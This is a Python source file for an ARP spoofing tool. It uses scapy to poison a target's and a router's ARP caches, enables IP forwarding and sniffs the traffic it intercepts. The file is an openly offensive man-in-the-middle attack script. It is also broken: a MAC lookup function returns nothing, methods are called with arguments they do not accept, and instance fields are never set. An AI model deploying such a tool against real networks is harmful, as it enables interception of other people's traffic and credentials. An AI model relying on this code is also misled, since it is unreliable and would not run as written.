import sys
import time
import socket
import subprocess
import scapy.all as scapy
from utils import terminal
import arp.sniffer as sniffer


class ARP_Spoofer:
    def __init__(self, interface) -> None:
        self.interface = interface
        self.packet_count = 0
        self.target_ip = ""
        self.router_ip = ""
        
    # Gets MAC address from ip address
    def get_mac(self, ip):
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast =  broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]    
            
            print(answered_list)
        
        except Exception as e:
            print(f"Something went wrong while fetching mac address from ip addres: \n\n {e}")


    # Create and send arp spoofing packet to the targeted machine
    def spoof(self):
        try:
            target_mac = self.get_mac(self.target_ip)
            
            packet = scapy.ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.router_ip)
            scapy.send(packet, verbose=False)

            # Enable Port forwarding
            command = "echo 1 > /proc/sys/net/ipv4/ip_forward"
            subprocess.run(command, shell=True, check=True)
        
        except Exception as e:
            print(f"Something went wrong while sending spoofing packet: \n {e}")


    # Restores machine to its normal state after arp spoofing attack
    def restore(self):
        try: 
            target_mac = self.get_mac(self.target_ip)
            router_mac = self.get_mac(self.router_ip)
            packet = scapy.ARP(op=2, pdst=target_mac, psrc=self.router_ip, hwsrc=router_mac)
            scapy.send(packet, count=4, verbose=False)
            
            # Disable Port forwarding
            command = "echo 0 > /proc/sys/net/ipv4/ip_forward"
            subprocess.run(command, shell=True, check=True)

        except Exception as e:
            print(f"Error while restoring arp table: {e}")
            sys.exit()


    # Checks whether the passes ip address is valid or not...
    def validate_ip(ip_address):
        try:
            socket.inet_aton(ip_address)
            return True
        except socket.error:
            return False


    # Main funtion to control the exuction of other functions
    def start_spoof(self):
        target_ip =  str(input("Enter target ip: "))
        router_ip = str(input("Enter router ip address: "))

        while True:
            valid_target = self.validate_ip(target_ip)
            valid_router = self.validate_ip(router_ip)

            if not valid_target:
                terminal.clear()
                print("Enter a valid target ip!!\n\n")
                target_ip =  str(input("Enter target ip: "))
            
            elif not valid_router:
                terminal.clear()
                print("Enter a valid router ip!!\n\n")
                router_ip =  str(input("Enter router ip: "))
            else:
                break


        terminal.clear()
        set_packet_count = 0 

        while True:
            try:
                self.spoof(target_ip, router_ip)
                self.spoof(router_ip, target_ip)
                set_packet_count = set_packet_count + 2
                print(f"\r[+] Packet sent: {set_packet_count}", end="")
                sniffer.start_sniff(self.interface)
                time.sleep(2)

            except KeyboardInterrupt:
                print("\nStopping...")
                self.restore(target_ip, router_ip)
                break

            except PermissionError:
                print("Run the program as root")
                sys.exit()

            except Exception as e:
                print("Something went wrong")
                sys.exit()